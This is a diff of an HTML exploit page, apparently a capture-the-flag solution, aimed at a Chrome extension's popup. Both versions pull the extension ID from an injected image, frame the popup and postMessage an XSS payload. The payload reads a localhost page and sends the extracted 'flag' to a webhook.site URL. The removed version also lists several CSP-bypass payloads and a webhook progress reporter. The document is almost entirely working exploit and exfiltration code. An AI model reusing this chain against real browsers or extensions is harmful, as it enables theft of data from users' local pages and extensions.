@@ -1,107 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
 <body>
-    <h1>Please wait...</h1>
-    <p id="status">Loading...</p>
-    
-    <!-- Trigger the extension first -->
-    <marquee>This will be replaced by extension</marquee>
-    
+    <marquee>test</marquee>
     <script>
-        const WEBHOOK = "https://webhook.site/05ba16cd-cf50-4eb3-89bd-43dfe2a61d6a";
-        
-        // Report progress to webhook
-        function report(status) {
-            fetch(WEBHOOK + '?status=' + encodeURIComponent(status)).catch(() => {});
-        }
-        
-        async function exploit() {
-            try {
-                report('started');
-                document.getElementById('status').textContent = 'Waiting for extension...';
-                
-                // Wait for extension to replace the marquee tag
-                await new Promise(resolve => {
-                    const check = () => {
-                        const img = document.querySelector('img[alt="STOP"]');
-                        if (img && img.src) {
-                            resolve(img);
-                        } else {
-                            setTimeout(check, 100);
-                        }
-                    };
-                    check();
-                });
-                
-                report('extension_detected');
-                document.getElementById('status').textContent = 'Extension detected, extracting ID...';
-                
-                // Extract extension ID dynamically
-                const img = document.querySelector('img[alt="STOP"]');
-                const extensionId = img.src.split('/')[2];
-                console.log('Extension ID:', extensionId);
-                report('id_extracted_' + extensionId);
-                
-                document.getElementById('status').textContent = 'Loading extension popup...';
-                
-                // Create iframe to extension popup
+        setTimeout(() => {
+            const img = document.querySelector('img[alt="STOP"]');
+            if (img) {
+                const extId = img.src.split('/')[2];
                 const iframe = document.createElement('iframe');
+                iframe.src = `chrome-extension://${extId}/popup.html`;
                 iframe.style.display = 'none';
-                iframe.src = `chrome-extension://${extensionId}/popup.html`;
-                
-                await new Promise((resolve, reject) => {
-                    iframe.onload = resolve;
-                    iframe.onerror = reject;
-                    document.body.appendChild(iframe);
-                });
-                
-                report('popup_loaded');
-                document.getElementById('status').textContent = 'Injecting payload...';
-                
-                // Try different payloads that might bypass CSP
-                const payloads = [
-                    // Try iframe approach
-                    `<iframe src="http://localhost:1337" onload="const x=this.contentDocument.body.innerText;if(x){fetch('${WEBHOOK}/flag?data='+encodeURIComponent(x))}"></iframe>`,
-                    
-                    // Try form submission
-                    `<form action="${WEBHOOK}" method="POST" id="f"><input name="source" value="http://localhost:1337"></form><script>document.getElementById('f').submit()</script>`,
-                    
-                    // Try meta refresh with data in URL
-                    `<meta http-equiv="refresh" content="0; url=${WEBHOOK}?redirect_from=http://localhost:1337">`,
-                    
-                    // Try object tag
-                    `<object data="http://localhost:1337" onload="alert('loaded')"></object>`
-                ];
-                
-                // Send the payload
-                iframe.contentWindow.postMessage({
-                    type: "SET",
-                    replacementString: payloads[0]  // Try the first payload
-                }, "*");
-                
-                report('payload_sent');
-                document.getElementById('status').textContent = 'Payload sent! Redirecting...';
-                
-                // Redirect to localhost
-                setTimeout(() => {
-                    report('redirecting_to_localhost');
-                    window.location.href = 'http://localhost:1337';
-                }, 2000);
-                
-            } catch (error) {
-                console.error('Exploit failed:', error);
-                report('error_' + error.message);
-                document.getElementById('status').textContent = 'Error: ' + error.message;
+                iframe.onload = () => {
+                    // Payload that fetches the flag
+                    const payload = `<img src=x onerror="fetch('http://localhost:1337').then(r=>r.text()).then(t=>{const m=t.match(/<marquee>([^<]+)<\\/marquee>/);if(m)fetch('https://webhook.site/05ba16cd-cf50-4eb3-89bd-43dfe2a61d6a?flag='+m[1])})">`;
+                    iframe.contentWindow.postMessage({
+                        type: "SET",
+                        replacementString: payload
+                    }, "*");
+                    setTimeout(() => location.href = 'http://localhost:1337', 1000);
+                };
+                document.body.appendChild(iframe);
             }
-        }
-        
-        // Start after page load
-        window.addEventListener('load', () => {
-            setTimeout(exploit, 1000);
-        });
+        }, 2000);
     </script>
 </body>
 </html>
